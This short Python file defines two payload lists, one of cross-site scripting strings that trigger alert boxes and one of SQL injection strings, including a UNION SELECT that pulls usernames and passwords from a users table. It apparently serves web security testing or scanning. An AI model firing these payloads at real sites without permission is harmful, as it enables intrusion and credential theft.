XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT null, null, username, password FROM users --",
    "' OR 'a'='a",
    "' OR 'x'='x' --"
]
